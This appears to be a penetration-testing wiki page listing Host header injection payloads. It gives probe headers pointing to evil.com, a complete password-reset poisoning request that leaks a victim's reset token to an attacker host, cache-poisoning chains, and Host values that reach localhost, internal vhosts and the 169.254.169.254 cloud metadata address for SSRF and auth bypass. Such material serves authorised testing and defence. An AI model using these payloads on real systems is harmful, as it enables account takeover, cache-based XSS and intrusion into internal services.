---
title: "Payloads: Host Header Injection"
type: payloads
tags: [payloads, host-header, misconfig, ssrf, web]
sources: []
date_created: 2026-06-16
date_updated: 2026-06-16
---

# Host Header Injection

Abuse a trusted/reflected `Host` (OWASP A05). Drives password-reset poisoning, cache poisoning, SSRF, and auth bypass. See [[http-host-header-attacks]]; reset chain [[account-takeover]].

## Probes
```
Host: evil.com                                  # does the app use it (links/redirects/emails)?
Host: target.com\r\nX: evil                     # CRLF in host
X-Forwarded-Host: evil.com                      # often unkeyed + trusted
X-Host: evil.com   X-Forwarded-Server: evil.com   Forwarded: host=evil.com
Host: target.com:80@evil.com   Host: evil.com:80
duplicate Host: target.com \n Host: evil.com    # which one wins?
absolute URL line: GET https://target.com/ + Host: evil.com
```

## Password reset poisoning (-> ATO)
```http
POST /reset HTTP/1.1
Host: evil.com
X-Forwarded-Host: evil.com

email=victim@t.com
```
Victim gets `https://evil.com/reset?token=...` -> token to attacker. See `wiki/payloads/auth-bypass.md`.

## Web cache poisoning
Unkeyed `X-Forwarded-Host` reflected into a script/link -> cached for all users -> XSS/resource swap. See `wiki/payloads/web-cache.md`.

## Routing-based SSRF / auth bypass
```
Host: localhost     Host: 127.0.0.1     Host: 169.254.169.254   # reach internal vhosts / metadata
Host: internal-admin.corp                                       # access internal-only vhost
Host: target.com -> /admin gated by Host -> spoof to bypass
```

## Real-world
`X-Forwarded-Host` reset poisoning is a classic ATO; routing-based SSRF via Host (Kettle research) reaches internal apps/metadata through the front-end. Always test what consumes the Host value.
